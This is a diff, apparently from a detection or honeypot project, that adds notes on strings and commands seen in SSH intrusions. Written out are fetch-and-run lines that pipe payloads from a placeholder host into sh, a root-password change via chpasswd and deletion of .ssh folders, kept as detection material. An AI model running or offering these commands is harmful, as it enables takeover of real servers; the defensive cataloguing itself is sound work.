@@ -87,3 +87,32 @@ wget (sha256: 942641e3997f98bd38ad91561f50910b071a9c495fdff745996cd6c0c2212c18);
 wget
 echo -e \x67\x61\x79\x66\x67\x74
 
+---
+
+Interesting strings for detection:
+- uname -a (fp risk)
+- mdrfckr
+- echo -e \x67\x61\x79\x66\x67\x74
+- chmod 777 (fp risk)
+- rm -rf .ssh
+- cp /bin/echo /{FOLDERFIXME}
+- chattr -ia .ssh
+- lockr -ia .ssh
+- curl http://ipinfo.io/org
+- wget http://{IPADDRESS}/FIXME
+
+other commands on initial access
+- whoami
+- crontab -l
+- cat /proc/cpuinfo | grep model | grep name | wc -l
+- lscpu | grep Model
+- top
+- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+- ls -lh $(which ls)
+- echo "root:v8mMGOTmWqns"|chpasswd|bash
+- curl http://{IPADDRESS}/x/3sh | sh
+- wget -c http://{IPADDRESS}/FIXME -P /tmp && sh /tmp/FIXME
+- wget -qO - http://{IPADDRESS}/FIXME | sh > /dev/null 2>&1 &
+- rm -rf /var/run/FIXME; wget -c http://{IPADDRESS}/FIXME -P /var/run && sh /var/run/FIXME
+- tftp -g 127.0.0.1 -r tsh ; sh tsh &
+
